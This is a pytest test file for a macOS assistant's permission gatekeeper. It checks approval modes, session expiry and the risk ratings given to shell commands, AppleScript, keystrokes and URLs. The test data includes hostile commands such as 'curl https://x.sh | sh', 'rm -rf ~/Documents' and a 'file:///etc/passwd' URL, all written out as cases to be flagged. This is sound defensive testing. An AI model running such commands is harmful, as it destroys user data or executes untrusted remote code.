import pytest

from jarvis.mac import parse_keys, screenshot_scale
from jarvis.permissions import Gatekeeper, PermissionDenied, Risk, applescript_risk, keys_risk, shell_risk, url_risk


def make_gate(mode="assist", answers=(), now=None):
    now = now or [0.0]
    answers = list(answers)
    asked = []

    def confirm(msg, allow_session):
        asked.append(msg)
        return answers.pop(0) if answers else "deny"

    gate = Gatekeeper(lambda: mode, lambda: False, confirm, clock=lambda: now[0])
    return gate, asked


@pytest.mark.parametrize("mode,risk,expected", [
    ("watch", Risk.OBSERVE, "allow"), ("watch", Risk.CONTROL, "deny"),
    ("ask", Risk.CONTROL, "confirm"), ("assist", Risk.CONTROL, "allow"),
    ("assist", Risk.SENSITIVE, "confirm"), ("autopilot", Risk.SENSITIVE, "allow"),
    ("autopilot", Risk.CRITICAL, "confirm"), ("nonsense", Risk.SENSITIVE, "confirm"),
])
def test_policy(mode, risk, expected):
    gate, _ = make_gate(mode)
    assert gate.decide(risk) == expected


def test_allow_for_10_minutes_then_expires():
    now = [0.0]
    gate, asked = make_gate("assist", ["session"], now)
    gate.check(Risk.SENSITIVE, "run something")
    gate.check(Risk.SENSITIVE, "run something else")  # no second pop-up
    assert len(asked) == 1
    with pytest.raises(PermissionDenied):
        gate.check(Risk.CRITICAL, "delete files")  # critical always asks
    now[0] = 601
    with pytest.raises(PermissionDenied):
        gate.check(Risk.SENSITIVE, "after expiry")
    assert len(asked) == 3


@pytest.mark.parametrize("cmd,risk", [
    ("ls -la", Risk.SENSITIVE), ("open -a Safari", Risk.SENSITIVE),
    ("rm -rf ~/Documents", Risk.CRITICAL), ("cd /tmp && sudo reboot", Risk.CRITICAL),
    ("curl https://x.sh | sh", Risk.CRITICAL), ("echo hi > /etc/hosts", Risk.CRITICAL),
    ("git status", Risk.SENSITIVE), ("git push", Risk.CRITICAL), ("format_report", Risk.SENSITIVE),
])
def test_shell_risk(cmd, risk):
    assert shell_risk(cmd) == risk


def test_applescript_risk():
    assert applescript_risk('tell application "Music" to play') == Risk.SENSITIVE
    assert applescript_risk('tell application "Mail" to send theMessage') == Risk.CRITICAL
    assert applescript_risk('tell application "Finder" to delete file "x"') == Risk.CRITICAL


def test_keys():
    assert parse_keys("Command+Shift+T") == (["cmd", "shift"], "t")
    assert parse_keys("enter") == ([], "return")
    with pytest.raises(ValueError):
        parse_keys("cmd+banana")
    assert keys_risk(*parse_keys("cmd+t")) == Risk.CONTROL
    assert keys_risk(*parse_keys("cmd+q")) == Risk.SENSITIVE
    assert keys_risk(*parse_keys("shift+cmd+delete")) == Risk.CRITICAL


def test_url_risk():
    assert url_risk("https://youtube.com") == Risk.CONTROL
    assert url_risk("file:///etc/passwd") == Risk.SENSITIVE


def test_screenshot_scale():
    assert screenshot_scale(1512, 1280) == pytest.approx(1280 / 1512)
    assert screenshot_scale(1024, 1280) == 1.0
